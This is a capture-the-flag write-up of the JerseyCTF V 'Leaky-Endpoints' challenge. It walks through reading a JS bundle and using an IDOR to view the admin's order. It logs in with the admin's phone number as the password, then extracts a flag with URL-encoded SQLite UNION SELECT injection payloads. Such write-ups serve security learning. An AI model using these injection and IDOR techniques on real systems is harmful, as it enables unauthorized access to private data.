---
title: "Leaky-Endpoints - JerseyCTF V"
category: "cloud"
subcategory: "idor"
type: "writeup"
tags: ["cloud", "sql-injection", "idor", "sqli", "jwt", "sqlite", "jerseyctf-v", "ctf-writeup"]
summary: "A client wanted me to create a website for their restaurant."
source:
  name: "CTFtime writeup #40134"
  url: "https://ctftime.org/writeup/40134"
ctf:
  name: "JerseyCTF V"
  challenge: "Leaky-Endpoints"
---

## Metadata

- **CTF:** JerseyCTF V
- **Task:** Leaky-Endpoints
- **Author team:** Lil L3ak
- **CTFtime tags:** sql-injection, idor
- **CTFtime:** <https://ctftime.org/writeup/40134>

---
## Challenge Description

A client wanted me to create a website for their restaurant. I wouldn't worry too much about giving your order details, but clients are weird, right? Unfortunately, the admin keeps using their personal information as passwords. I keep telling them that I'll set a good flag, but they never listen.

## Initial Reconnaissance

When I first accessed the website, I was greeted with a standard login/register page - nothing special at first glance.  
Peeking at the page source, I spotted a reference to a JavaScript bundle:

```html

<html lang="en">  
<head>  
<meta charset="UTF-8" />  
<meta name="viewport" content="width=device-width, initial-scale=1.0" />  
<title>Smoke & Mirrors</title>  
<script src="/static/bundle.js" defer></script>  
<link rel="icon" href="/static/favicon.ico" />  
</head>  
<body >  
<div id="root"></div>  
</body>  
</html>

```

## JavaScript Analysis

Diggin into that bundle.js file and looking through the massive JavaScript file, I discovered an interesting function making API calls to two endpoints:

```jsx  
const admin_data = () => {  
const [adminData, setAdminData] = useState({});  
const [loading, setLoading] = useState(true);

useEffect(() => {  
// First admin endpoint  
fetch("/api/admin")  
.then((response) => response.json())  
.then((data) => {  
setAdminData(data);  
setLoading(false);  
});

// Second admin endpoint with /dev path  
fetch("/api/admin/dev/users/admin")  
.then((response) => response.json())  
.then((data) => {  
console.log("Admin Dev Data:", data);  
});  
}, []);  
}

```

Both endpoints gave me "unauthorized" errors when I tried them directly. But now I knew what to aim for - I needed admin access!

## User Account Creation

I created a regular account and inspected the JWT token:

```  
{  
"alg": "HS256",  
"typ": "JWT"  
}  
{  
"email": "admin",  
"exp": 1743610236,  
"id": 1,  
"name": "admin",  
"role": "customer"  
}

```

I needed to become an "admin" somehow, but simply modifying the JWT wouldn't work without the signing key.

## Exploring Functionality

I decided to explore the site as a normal user. The order functionality looked promising, but the address validation kept rejecting my inputs. I went back to the Checkout() function in bundle.js and found pages of validation rules, including functions like:

```jsx  
function isValidAddress(full_address, state, country, postal_code) {  
const postalCodeRegex = {  
US: /^[0-9]{5}(-[0-9]{4})?$/, // USA ZIP Code format  
CA: /^[A-Za-z]\d[A-Za-z] ?\d[A-Za-z]\d$/, // Canada postal code format  
UK: /^[A-Z]{1,2}\d[A-Z\d]? ?\d[A-Z]{2}$/i, // UK postcode format  
AU: /^\d{4}$/, // Australia postal code format  
};

// Many more validation rules...  
}

```

After finally placing an order, I noticed the confirmation page URL followed a pattern:

```  
<http://leaky-endpoints.aws.jerseyctf.com/Orders/15/104>

```

What if I could peek at other orders? And what if the very first order was placed by the admin? It totally makes sense to be placed by the admin

```  
<http://leaky-endpoints.aws.jerseyctf.com/Orders/1/1>

```

I found the admin's order information:

```  
Name: Admin User  
Email: [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)  
Full Address: 123 Main St  
State: NJ  
Country: USA  
Postal Code: 12345  
Phone: 5111111111  
Status: confirmed  
Created At: 2023-03-29T03:59:14Z

```

## Gaining Admin Access

Remember the challenge hint? *"The admin keeps using their personal information as passwords."*  
I tried logging in as [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection) with the phone number 5111111111 as the password and it worked.

## Exploiting Admin Endpoints

With my new admin account, I first tried hitting:

```  
<http://leaky-endpoints.aws.jerseyctf.com/api/admin/dev/users/admin>

```

It returned an error, but a very informative one:

```  
{"error": "failed to get user: no such column: admin"}

```

That smells like a SQL injection opportunity! But first, let's check the other admin endpoint:

```  
<http://leaky-endpoints.aws.jerseyctf.com/api/admin/users>

```

This gave me a full list of all the users in the system:

```json  
[  
{  
"id": 1,  
"name": "admin",  
"email": "[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)",  
"role": "admin"  
},  
{  
"id": 2,  
"name": "Abc",  
"email": "[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)",  
"role": "customer"  
},  
{  
"id": 3,  
"name": "mark",  
"email": "[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)",  
"role": "customer"  
},  
{  
"id": 4,  
"name": "{(#?)}",  
"email": "[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)",  
"role": "customer"  
},  
{  
"id": 5,  
"name": "admin",  
"email": "[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)",  
"role": "customer"  
}  
]

```

Useful, but not the flag I was looking for.

## SQL Injection

That error message suggested I could inject some SQL. I tried enumerating the database tables:

```  
<http://leaky-endpoints.aws.jerseyctf.com/api/admin/dev/users/2%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type='table'%20-->

```

Success! The database revealed several tables:

```json  
{  
"name": "flag"  
},  
{  
"name": "menu_items"  
},  
{  
"name": "order_info"  
},  
{  
"name": "order_items"  
},  
{  
"name": "orders"  
},  
{  
"name": "sqlite_sequence"  
},  
{  
"name": "users"  
},  
{  
"name": "flog3"  
}

```

The table named `flog3` caught my attention. I tried extracting its contents:

```  
<http://leaky-endpoints.aws.jerseyctf.com/api/admin/dev/users/1%20UNION%20SELECT%20group_concat(name)%20FROM%20flog3>

```

And there it was, the flag. I had secured first blood on this challenge.

```json  
{  
"name": "admin"  
},  
{  
"name": "jctf{id0Rs$UmWqYsloumcnHnNp}"  
}

```
